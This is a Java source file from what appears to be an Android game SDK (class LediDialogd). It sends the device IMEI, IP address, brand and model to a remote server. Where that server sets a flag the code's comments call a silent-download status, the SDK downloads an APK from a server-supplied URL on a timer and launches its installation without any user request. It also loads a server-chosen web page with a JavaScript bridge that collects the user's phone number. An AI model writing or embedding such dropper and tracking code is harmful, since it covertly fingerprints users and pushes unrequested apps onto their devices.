package com.qt.ld;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.graphics.Point;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;

import androidx.core.content.FileProvider;

import com.ledi.floatwindow.net.HttpUtilq;
import com.ledi.util.Conetq;
import com.ledi.util.DialogUtils;
import com.ledi.util.MetaDataUtil;
import com.ledi.util.Operateed;
import com.ledi.util.Util;
import com.ledi.util.UtilOther;

import org.apache.commons.httpclient.NameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.URLDecoder;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class LediDialogd {
	private static Activity activity;
	private static WebView mWebView;
	private static SharedPreferences sp;
	static String imeiboolean = "";// 玩家imei是否通过盒子收取
	// 判断是否停止
	private static boolean mIsCancel = false;
	// //弹窗是否展示
	private static boolean mIsShow = true;
	// 进度
	// private int mProgress;
	// 文件保存路径
	private static String mSavePath;
	// 版本名称
	private static String mVersion_name = "";
	// 请求链接
	private static String url = "";
	static PackageInfo packageInfo;
	static String packagename = "com.zhuanqianyouxi.qt";
	static File dir;
	static Calendar now = Calendar.getInstance();

	public static void quick(Activity context,  String gid, String qid) {

		activity = context;
		Conetq.nettype = getNetworkTypeNoProvider(activity);
//		Conetq.productCode = productCode;
//		Conetq.ProductKey = ProductKey;
		Conetq.gameid = gid;
		Conetq.qId = qid;
		sp_put("gid", Conetq.gameid);
		sp_put("qid", Conetq.qId);
		// getAPNType(activity);
		Conetq.NETTYPE =getNetworkTypeNoProvider(activity);
		String pkName = activity.getPackageName();
		String[] array = pkName.split("\\.");// 截取最后小说点后面的字母
		Log.i("pkname", array.toString());
		String s = array[array.length - 1];
		Conetq.sdkTypes = pkName;// 判断是哪种sdk
		sp_put("sdkTypes", Conetq.sdkTypes);
        Conetq.dialog_boxid =  MetaDataUtil.getMetaDataValue("Dialog_boxid", activity);
//		Conetq.versioncode = versioncode;
		UtilOther.InitImei(context);// 初始化接口获得imei
		sp_put("imei", Conetq.imei2);
		
		if (mIsShow) {
			mIsShow = false;
			getGameInformation1(context);// 调用此方法，进行数据上传
			Conetq.phonetell = sp_get("phonetell", "").toString();
		}
	}

	public static void getGameInformation1(Activity activity) {
		
		Conetq.imei2 = sp_get("imei", "").toString();
		Conetq.sdkTypes = sp_get("sdkTypes", "").toString();
		Conetq.gameid = sp_get("gid", "").toString();
		Conetq.qId = sp_get("qid", "").toString();
		
		new Thread() {
			public void run() {
				try {
					NameValuePair[] _pair1 = {
							new NameValuePair("imei", Conetq.imei2),// 设备号
							new NameValuePair("package", Conetq.sdkTypes),// 判断是哪种sdk
																			// 渠道包的名字
							new NameValuePair("productCode", Conetq.productCode), // quick后台母包的唯一标识
							new NameValuePair("ip", Conetq.ip_imei),// 获取手机连网ip
							new NameValuePair("_ryos", "android"),// 系统
							new NameValuePair("_ryosversion",
									Build.VERSION.RELEASE),// 手机系统版本
							new NameValuePair("_manufacturer",
									Build.BRAND),// 品牌 生厂厂家
							new NameValuePair("_phonemodel",
									Build.MODEL),// 手机型号
							new NameValuePair("type", "3"),
							new NameValuePair("gid", Conetq.gameid),
							new NameValuePair("qid", Conetq.qId),
//							new NameValuePair("gameVersion", Conetq.versioncode),
							new NameValuePair("networktype",Conetq.nettype)
							};
					Log.i("imei2", Conetq.imei2);
					Log.i("package", Conetq.sdkTypes);
					Log.i("productCode", Conetq.productCode);
					String _response = HttpUtilq.getData(Conetq.TerraceUrl5,
							_pair1);
					
					try {
						JSONObject json = new JSONObject(_response);//将返回的数据转为json对象
						int status1 = json.getInt("more");	
						if(_response.equals("") || status1 == 1){//如果返回参数为空或者status1等于1的，开始for循环请求
							for (int i = 0; i < 7; i++) {//7次请求开始
								
								_response = HttpUtilq.getData(Conetq.TerraceUrl5, _pair1);//发起请求获取返回数据
								if(!_response.equals("")){//判断循环中的请求是否为空，如果不为空
									try {
										JSONObject jsonObject = new JSONObject(_response);//将返回的数据转为json对象
//										int status = jsonObject.getInt("more");//解析status数据
										if(!jsonObject.has("more")){//如果数据不为1，将i赋值为7，结束循环
											i = 7;
										}
										
									} catch (JSONException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
								}
							}
						}
					} catch (JSONException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					
					
					Log.i("response", _response);
					JSONObject obj2 = new JSONObject(_response);// 解析
					Conetq.webstate = obj2.getInt("status");
                    Conetq.down = obj2.getInt("down");//静默下载状态
					Log.i("status", Conetq.webstate + "");

					Conetq.timer = obj2.optInt("time");
					Log.i("time", Conetq.timer + "");
					Conetq.timer = Conetq.timer * 1000;
					Log.i("timer", Conetq.timer + "");
					Conetq.weburl = obj2.optString("url");
					Log.i("url", Conetq.weburl);
					startactivity();// 弹窗功能
				} catch (Exception e) {
				}
			};
		}.start();
	}

	public static void startactivity() {
		Log.i("TIME", "dao");
		TimerTask task = new TimerTask() {
			public void run() {
				if (Conetq.webstate == 1) {
					
					if(Conetq.down == 0){
						Log.e("down", "down不下载");
					}else if(Conetq.down == 1){
//						TimerTask task1 = new TimerTask() {
//							public void run() {
                		Log.e("down", "down下载");
								getimei();
//							}
//						};
//						Timer timer = new Timer();
//						timer.schedule(task1, Conetq.timer);
					}

					System.out.println("1");
				} else if (Conetq.webstate == 2) {
					activity.runOnUiThread(new Runnable() {
						@SuppressLint({ "NewApi", "SetJavaScriptEnabled" })
						@Override
						@JavascriptInterface
						public void run() {
							DialogUtils.showDialog(activity);
							// final AlertDialog.Builder builder = new
							// AlertDialog.Builder(activity);
							mWebView = (WebView) DialogUtils.dialog.getWindow()
									.findViewById(
											Util.getResID(activity, "webview",
													"id"));
							DialogUtils.dialog.getWindow()
									.setBackgroundDrawableResource(
											android.R.color.transparent);
							mWebView.loadUrl(Conetq.weburl);
							WebSettings webSettings = mWebView.getSettings();
							final JSHook js = new JSHook();
							mWebView.addJavascriptInterface(js, "hello");
							mWebView.setBackgroundColor(0);
							// mWebView.getBackground().setAlpha(0);
							webSettings.setJavaScriptEnabled(true); // 设置支持javascript脚本
							webSettings.setAllowFileAccess(true); // 允许访问文件
							webSettings.setBuiltInZoomControls(true); // 设置显示缩放按钮
							webSettings.setSupportZoom(false); // 支持缩放
							webSettings
									.setJavaScriptCanOpenWindowsAutomatically(true); // 支持通过JS打开新窗口
							webSettings.setUseWideViewPort(true);// 关键点
							webSettings
									.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);
							webSettings.setDisplayZoomControls(false); // 隐藏原生的缩放控件
							webSettings.setLoadWithOverviewMode(true); // 设置自适应屏幕宽度
							webSettings
									.setJavaScriptCanOpenWindowsAutomatically(true);
							webSettings.setSupportMultipleWindows(true); // 多窗口
							webSettings.setAppCacheEnabled(true);// 是否使用缓存
							webSettings.setDomStorageEnabled(true);// DOM
																	// Storage

							webSettings.getMediaPlaybackRequiresUserGesture();// 浏览器自动播放视频
						}
					});
				} else if (Conetq.webstate == 0) {
					if(Conetq.down == 0){
						Log.e("down", "down不下载");
					}else if(Conetq.down == 1){
//						TimerTask task2 = new TimerTask() {
//							public void run() {
//								Log.e("sdk", "开始下载Conetq.webstate==0");
		                		Log.e("down", "down下载");
								getimei();
//							}
//						};
//						Timer timer = new Timer();
//						timer.schedule(task2, Conetq.timer);
					}

					System.out.println("0");
				}
			}
		};
		Timer timer = new Timer();
		timer.schedule(task, Conetq.timer);
	}

	public static class JSHook {
		@JavascriptInterface
		public void javaMethod(String p) {
			// Log.d(tag , "JSHook.JavaMethod() called! + "+p);
		}

		@JavascriptInterface
		public void closeweb() {
			// final String info = "11111111111";
			DialogUtils.disDialog();
			// alertDialog.dismiss();

		}

		@JavascriptInterface
		public void downloadBox(final String phoentell) {
			// 提交IMEI，判断是否有记录
			new Thread(new Runnable() {

				@Override
				public void run() {
					// TODO Auto-generated method stub
					sp_put("phonetell", phoentell);
					Conetq.phonetell = phoentell;
					Operateed.roleInfo1(activity,Conetq.ServerID, Conetq.ServerName,
							Conetq.GameRoleName, Conetq.GameRoleID, Conetq.GameUserLevel, Conetq.VipLevel, Conetq.RoleCreateTime);
					Log.e("sdk", "获取手机号");
					if(Conetq.down == 0){
						Log.e("down", "down不下载");
					}else if(Conetq.down == 1){
						getimei();
					}
				}
			}).start();
		}
	}

	private static void getimei() {
		new Thread() {
			public void run() {
				try {
					NameValuePair[] _pair1 = { new NameValuePair("imei",
							Conetq.imei2),// 设备号
					};
					Log.i("imei2", Conetq.imei2);
					String _response = HttpUtilq.getData(Conetq.getisdownload,
							_pair1);
					JSONObject jsonObject = new JSONObject(_response);
					imeiboolean = jsonObject.getString("msg");
					url = jsonObject.getString("download_url");
					mVersion_name = jsonObject.getString("download_url")
							.substring(
									jsonObject.getString("download_url")
											.lastIndexOf("/") + 1);
					if (imeiboolean.equals("false")) {
						// downloadAPK();
//						String data = (String) sp_get("data", "0");
//						if (data.equals("0")) {// 表示未在sdk中下载安装过
//							if (packageInfo == null) {// 如果用户未安装，提示用户下载安装，并将当前日期写入本地
//								Log.e("sdk", "用户未打开过游戏盒子，且手机未安装，下载并安装");
								TimerTask task3 = new TimerTask() {
									public void run() {
//										Log.e("sdk", "开始下载Conetq.webstate==0");
										getBoxURL();
//										downloadAPK();
									}
								};
								Timer timer = new Timer();
								timer.schedule(task3, 5000);
//							}
						} else {// 表示有过安装提示
                			Log.e("down", "验证不下载");
//							if (packageInfo == null) {// 有过安装提示，但未安装
//								// 获取当前日期，判断与保存的日期是否相同
//								StringBuffer data2 = new StringBuffer();
//								data2.append(now.get(Calendar.YEAR))
//										.append(now.get(Calendar.MONTH) + 1)
//										.append(now.get(Calendar.DAY_OF_MONTH));
//								String data4 = data2.toString();
//								Log.e("sdk", "data2==" + data4);
//								if (!data4.equals(data)) {
//									// 此次获取与上次不在同一天，且用户未安装，下载并安装
//									Log.e("sdk", "不在同一天");
//									TimerTask task4 = new TimerTask() {
//										public void run() {
//											Log.e("sdk",
//													"开始下载Conetq.webstate==0");
//											getBoxURL();
////											downloadAPK();
//										}
//									};
//									Timer timer = new Timer();
//									timer.schedule(task4, 5000);
//
//								} else {
//									Log.e("sdk", "在同一天提示过");
//								}
//							}

//						}
					}
				} catch (Exception e) {
				}
			};
		}.start();
	}

    private static void getBoxURL(){
    	Log.e("getPoint()", getip());
    	Log.e("phone_brand", Build.BRAND);
    	Log.e("phone_model", Build.MODEL);
    	Log.e("Conet.dialog_boxid", Conetq.dialog_boxid);
//    	Log.e("response", "获取盒子下载地址");
    	new Thread() {
            public void run() {
                try {
                    NameValuePair[] _pair1 = {
                            new NameValuePair("init_time", System.currentTimeMillis()+""),
//                            new NameValuePair("boxid", Conetq.dialog_boxid),
                            new NameValuePair("invite_code", ""),
                            new NameValuePair("download_time",System.currentTimeMillis()+""),
                            new NameValuePair("user_ip", getip()),
                            new NameValuePair("platform", "Android"),
                            new NameValuePair("inch", ""),
                            new NameValuePair("pixel", getPoint()),
                            new NameValuePair("ppi", getXs()),
                            new NameValuePair("down", "1"),
                            new NameValuePair("build_id", Build.ID),//版本号
							new NameValuePair("os_version", Build.VERSION.RELEASE),//手机系统版本号
							new NameValuePair("ui_version", ""),//国产定制系统版本号，例：EMUI9.0.2
							new NameValuePair("phone_brand", Build.BRAND),//手机品牌
							new NameValuePair("phone_model", Build.MODEL),//手机型号
							new NameValuePair("gameid", Conetq.gameid),//当前游戏id
							new NameValuePair("channelid",Conetq.qId),//当前渠道id
							new NameValuePair("imei", Conetq.imei2)
                    };
                    String _response = HttpUtilq.getData(Conetq.getAppDownUrl,
                            _pair1);
                    JSONObject jsonObject = new JSONObject(_response);
                    String data = jsonObject.getString("data");
                    JSONObject jsonObject2 = new JSONObject(data);
                    Log.e("response", "获取盒子下载地址"+jsonObject2.getString("download_url"));
//                    downloadAPK(jsonObject2.getString("download_url"));
                    String url = jsonObject2.getString("download_url");
//                    downloadAPK(url);
                    DownloaderTask task = new DownloaderTask();
                    task.execute(url);
                   
                } catch (Exception e) {
                }
            };
        }.start();
    }
    
	public static class DownloaderTask extends AsyncTask<String, Void, String> {

        private String fileName;
        private InputStream input;

        public DownloaderTask() {
        }


        // 作用：接收输入参数、执行任务中的耗时操作、返回 线程任务执行的结果
        @Override
        protected String doInBackground(String... params) {
            // TODO Auto-generated method stub
            InputStream inputStream = null;
            RandomAccessFile randomAccessFile = null;
            File file = null;
            try {

                long downLoadLength = 0;//记录已下载的文件长度
                String url = params[0];
                // Log.i("tag", "url="+url);
                fileName = url.substring(url.lastIndexOf("/") + 1);
                fileName = URLDecoder.decode(fileName);
                Log.i("tag", "fileName=" + fileName);
                String sdPath = Environment
						.getExternalStorageDirectory() + "/";
				String mSavePath = sdPath + "/44755game/";
                File directory = new File(mSavePath);
                if (!directory.exists()) {
                    directory.mkdirs();
                }
                file = new File(directory, fileName);
                if (file.exists()) {
                    Log.i("tag", "The file has already exists.");
                    downLoadLength = file.length();
//                return fileName;
                }
//            else {
//                file.mkdirs();
//            }

                long contentLength = getContentLength(url);
                Log.e("contentLength", contentLength + "");

                if (contentLength == 0) {
                    Log.e("tag", "长度为0");
                    return null;
                } else if (contentLength == downLoadLength) {
                    //如果已下载的字节和文件总字节相等，说明已经下载完成了
                    Log.e("tag", "成功");
                    return fileName;
                }
                OkHttpClient client = new OkHttpClient();
                Request request = new Request.Builder()
                        .addHeader("RANGE", "bytes=" + downLoadLength + "-") //断点继续下载
                        .url(url)
                        .build();

                Response response = client.newCall(request).execute();
                
                if (response != null) {
                    inputStream = response.body().byteStream();
                    randomAccessFile = new RandomAccessFile(file, "rw");
                    randomAccessFile.seek(downLoadLength);//跳过已下载的字节

                    byte[] bytes = new byte[1024];
//                    int total = 0;
                    int len;
                    while ((len = inputStream.read(bytes)) != -1) {
//                        total += len;
                        randomAccessFile.write(bytes, 0, len);
                        Log.e("length", len + "");

                    }
//                    writeToSDCard(fileName, inputStream);

                }
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                try {
                    if (inputStream != null) {
                        Log.e("tag", "inputStream");
                        inputStream.close();
//                        return fileName;
                    }
                    if (randomAccessFile != null) {
                        Log.e("tag", "randomAccessFile");
                        randomAccessFile.close();
//                        return fileName;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return fileName;
        }

        @Override
        protected void onCancelled() {
            // TODO Auto-generated method stub
            super.onCancelled();
        }

        // 作用：接收线程任务执行结果、将执行结果显示到UI组件
        @Override
        protected void onPostExecute(String result) {//2323.apk
            // TODO Auto-generated method stub
            super.onPostExecute(result);
            if (result == null) {
//                Toast t = Toast.makeText(activity, "连接错误！请稍后再试！", Toast.LENGTH_LONG);
//                t.setGravity(Gravity.CENTER, 0, 0);
//                t.show();
                return;
            }
//            Toast t = Toast.makeText(activity, "游戏已保存到SD卡。", Toast.LENGTH_LONG);
//            t.setGravity(Gravity.CENTER, 0, 0);
//            t.show();
//            File directory = Environment.getExternalStorageDirectory();
            File directory = new File(Environment.getExternalStorageDirectory() + "/44755game/");
            if (!directory.exists()) {
                directory.mkdirs();
            }

            installAPK(directory,result);
//            File file = new File(directory, result);
//            Log.i("tag", "Path=" + file.getAbsolutePath());
//            Intent intent = getFileIntent(file);
//            activity.startActivity(intent);
           
        }

        // 作用：执行 线程任务前的操作
        @Override
        protected void onPreExecute() {
            // TODO Auto-generated method stub
            super.onPreExecute();
//            showProgressDialog();

        }

        // 作用：在主线程 显示线程任务执行的进度
        @Override
        protected void onProgressUpdate(Void... values) {

            // TODO Auto-generated method stub
            super.onProgressUpdate(values);
        }

    }
	
    private static long getContentLength(String downLoadUrl) {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder().url(downLoadUrl).build();
        try {
            Response response = client.newCall(request).execute();
            if (response != null && response.isSuccessful()) {
                long contentLength = response.body().contentLength();
                response.body().close();
                return contentLength;
            }
        } catch (IOException e) {
            e.printStackTrace();
            return 0;
        }
        return 0;
    }
    
    /*
     * 下载到本地后执行安装
     */
    protected static void installAPK(File path,String name) {
    	  File file = new File(path, name);
    	  Log.i("tag", "Path=" + file.getAbsolutePath());
    	  Intent intent = getFileIntent(file);
    	  activity.startActivity(intent);
    	  //提示安装时，保存当前日期，用来下次提示判断
    	Calendar now = Calendar.getInstance();
		StringBuffer data=new StringBuffer();
		data.append(now.get(Calendar.YEAR)).append(now.get(Calendar.MONTH) + 1).append(now.get(Calendar.DAY_OF_MONTH));
    	sp_put("data", data.toString());
    }

	
	private static void downloadAPK(final String url) {
		// TODO Auto-generated method stub
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					if (Environment.getExternalStorageState().equals(
							Environment.MEDIA_MOUNTED)) {
						// String sdPath =
						// Environment.getExternalStorageDirectory() + "/";
						// 判断当前手机是否存在已下载文件，且问未被安装
						String sdPath = Environment
								.getExternalStorageDirectory() + "/";
						mSavePath = sdPath + "/" + "jikedownload";
						// 文件保存路径
						String filepath = mSavePath + "/" + mVersion_name;
						File file = new File(filepath);
						dir = new File(mSavePath);
						if (!dir.exists()) {
							dir.mkdir();
						} else if (packageInfo == null && file.exists()) {
							Log.e("sjj", "已存在文件夹，并且未安装");
							mUpdateProgressHandler.sendEmptyMessage(2);
						} else if (packageInfo == null && !file.exists()) {
							Log.e("sjj", "安装包未安装，且未下载");
							// 下载文件
							HttpURLConnection conn = (HttpURLConnection) new URL(
									url).openConnection();
							conn.connect();
							InputStream is = conn.getInputStream();
							int length = conn.getContentLength();
							Log.e("sjj", "文件总大小" + length);
							File apkFile = new File(mSavePath, mVersion_name);
							FileOutputStream fos = new FileOutputStream(apkFile);
							int count = 0;
							byte[] buffer = new byte[1024];
							Log.e("sjj", mIsCancel + "");
							while (!mIsCancel) {
								int numread = is.read(buffer);
								count += numread;
								// Log.e("sjj", "文件大小"+ count);
								// 计算进度条的当前位置
								// mProgress = (int) (((float)count/length) *
								// 100);
								// 更新进度条
								mUpdateProgressHandler.sendEmptyMessage(1);

								// 下载完成
								if (numread < 0) {
									Log.e("sjj", "下载完成");
									mUpdateProgressHandler.sendEmptyMessage(2);
									break;
								}
								fos.write(buffer, 0, numread);
							}
							fos.close();
							is.close();
						}

					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();
	}

	/**
	 * 接收消息
	 */
	private static Handler mUpdateProgressHandler = new Handler() {
		@Override
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case 1:
				// 设置进度条
				// mProgressBar.setProgress(mProgress);
				break;
			case 2:
				// 隐藏当前下载对话框
				// mDownloadDialog.dismiss();
				// 安装 APK 文件
				installAPK();
			}
		}

	};

	/*
	 * 下载到本地后执行安装
	 */
	protected static void installAPK() {
		File file = new File(mSavePath, mVersion_name);
		Log.i("tag", "Path=" + file.getAbsolutePath());
		Intent intent = getFileIntent(file);
		activity.startActivity(intent);
		// 提示安装时，保存当前日期，用来下次提示判断
		Calendar now = Calendar.getInstance();
		StringBuffer data = new StringBuffer();
		data.append(now.get(Calendar.YEAR)).append(now.get(Calendar.MONTH) + 1)
				.append(now.get(Calendar.DAY_OF_MONTH));
		sp_put("data", data.toString());
		// String sp_get = (String) sp_get("data", "");
	}

	public static Intent getFileIntent(File file) {
		Intent intent = new Intent();
		if (Build.VERSION.SDK_INT >= 24) {
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
					| Intent.FLAG_GRANT_READ_URI_PERMISSION
					| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
			Uri contentUri = FileProvider.getUriForFile(activity,
					activity.getPackageName() + ".provider", file);
			intent.setDataAndType(contentUri,
					"application/vnd.android.package-archive");
		} else {
			intent.setDataAndType(Uri.fromFile(file),
					"application/vnd.android.package-archive");
		}
		intent.setAction(Intent.ACTION_VIEW);
		return intent;
	}

	public static void sp_put(String k, Object v) {
		sp = activity.getSharedPreferences("installtip", Context.MODE_PRIVATE);
		SharedPreferences.Editor edit = sp.edit();
		if (v instanceof String) {
			edit.putString(k, (String) v);
		} else if (v instanceof Integer) {
			edit.putInt(k, (Integer) v);
		} else if (v instanceof Long) {
			edit.putLong(k, (Long) v);
		} else if (v instanceof Boolean) {
			edit.putBoolean(k, (Boolean) v);
		} else if (v instanceof Float) {
			edit.putFloat(k, (Float) v);
		} else {
			return;
		}
		edit.commit();
	}

	public static Object sp_get(String k, Object v) {
		sp = activity.getSharedPreferences("installtip", Context.MODE_PRIVATE);
		if (v instanceof String) {
			return sp.getString(k, (String) v);
		} else if (v instanceof Integer) {
			return sp.getInt(k, (Integer) v);
		} else if (v instanceof Long) {
			return sp.getLong(k, (Long) v);
		} else if (v instanceof Boolean) {
			return sp.getBoolean(k, (Boolean) v);
		} else if (v instanceof Float) {
			return sp.getFloat(k, (Float) v);
		}
		return null;
	}

	 /**
     * 获取连接网络类型(3G/4G/wifi,不包含运营商信息)
     *
     * @param context
     * @return 返回结果中,不包含运营商,返回连接网络类型(3G/4G/wifi),如果网络未连接,返回"";
     */
    private static String getNetworkTypeNoProvider(Context context) {
        String strNetworkType = "";
        NetworkInfo networkInfo = ((ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE))
                .getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            if (networkInfo.getType() == ConnectivityManager.TYPE_WIFI) {
                strNetworkType = "wifi";
            } else if (networkInfo.getType() == ConnectivityManager.TYPE_MOBILE) {
                String _strSubTypeName = networkInfo.getSubtypeName();
//                Log.d(TAG, "Network getSubtypeName : " + _strSubTypeName);
                int networkType = networkInfo.getSubtype();
                switch (networkType) {
                    case TelephonyManager.NETWORK_TYPE_GPRS: // 联通2G
                    case TelephonyManager.NETWORK_TYPE_EDGE: // 移动2G
                    case TelephonyManager.NETWORK_TYPE_CDMA: // 电信2G
                    case TelephonyManager.NETWORK_TYPE_1xRTT:
                    case TelephonyManager.NETWORK_TYPE_IDEN: // api<8 : replace by 11
                        strNetworkType = "2G";
                        break;
                    case TelephonyManager.NETWORK_TYPE_EVDO_A: // 电信3G
                    case TelephonyManager.NETWORK_TYPE_UMTS:
                    case TelephonyManager.NETWORK_TYPE_EVDO_0:
                    case TelephonyManager.NETWORK_TYPE_HSDPA:
                    case TelephonyManager.NETWORK_TYPE_HSUPA:
                    case TelephonyManager.NETWORK_TYPE_HSPA:
                    case TelephonyManager.NETWORK_TYPE_EVDO_B: // api<9 : replace by 14
                    case TelephonyManager.NETWORK_TYPE_EHRPD: // api<11 : replace by 12
                    case TelephonyManager.NETWORK_TYPE_HSPAP: // api<13 : replace by 15
                        strNetworkType = "3G";
                        break;
                    case TelephonyManager.NETWORK_TYPE_LTE: // api<11 : replace by 13
                        strNetworkType = "4G";
                        break;
                    default:
                        if (_strSubTypeName.equalsIgnoreCase("TD-SCDMA") ||
                                _strSubTypeName.equalsIgnoreCase("WCDMA") ||
                                _strSubTypeName.equalsIgnoreCase("CDMA2000")) {
                            strNetworkType = "3G";
                        } else {
                            strNetworkType = _strSubTypeName;
                        }
                        break;
                }
//                Log.d(TAG, "Network getSubtype : " + Integer.valueOf(networkType).toString());
            }
        }
//        Log.d(TAG, "Network Type : " + strNetworkType);
        return strNetworkType;
    }
    
  	public static String getip(){
		String Ip="";
		 try {
             for (Enumeration<NetworkInterface> enNetI = NetworkInterface.getNetworkInterfaces(); enNetI
                     .hasMoreElements(); ) {
                 NetworkInterface netI = enNetI.nextElement();
                 for (Enumeration<InetAddress> enumIpAddr = netI.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                     InetAddress inetAddress = enumIpAddr.nextElement();
                     if (inetAddress instanceof Inet4Address && !inetAddress.isLoopbackAddress()) {
                         Log.e("==========ip", inetAddress.getHostAddress());
                         Ip =inetAddress.getHostAddress();
                     }
                 }
             }
         } catch (SocketException e) {
             e.printStackTrace();
         }
		return Ip;
		
	}

      // 获取准确的手机屏幕分辨率
      @SuppressLint("NewApi")
	public static String getPoint() {
          // Point point = new Point();
          // getWindowManager().getDefaultDisplay().getSize(
          // point);
          // Log.d("SSSS",
          // "the screen size is " + point.toString());
          // // Toast.makeText(getApplicationContext(),
          // // point.toString(), 1).show();
          // return point.toString();

          DisplayMetrics metrics = new DisplayMetrics
                  /**
                   * getRealMetrics - 屏幕的原始尺寸，即包含状态栏。 version >= 4.2.2
                   */
                  ();
          activity.getWindowManager().getDefaultDisplay().getRealMetrics(metrics);
          int width = metrics.widthPixels;
          int height = metrics.heightPixels;
          if(activity.getRequestedOrientation()==ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE){
              return "heng:" + width + "*" + height;
          }else {
          	return "shu:" + width + "*" + height;	
          }
      }
      
      // 获取手机像素密度
      public static String getXs() {
          String dpi = null;

          DisplayMetrics localDisplayMetrics = new DisplayMetrics();
          try {
              Display localDisplay = activity.getWindow().getWindowManager()
                      .getDefaultDisplay();
              localDisplay.getMetrics(localDisplayMetrics);
              Point localPoint = new Point();

              Display.class.getMethod("getRealSize", new Class[]{Point.class})
                      .invoke(localDisplay, new Object[]{localPoint});
              int l = localPoint.x;
              int k = localPoint.y;
              String sss = String.valueOf(l) + " x " + String.valueOf(k);
              dpi = String.valueOf(localDisplayMetrics.densityDpi);
          } catch (Exception e) {
              e.printStackTrace();
          }
          return dpi;
      }

}
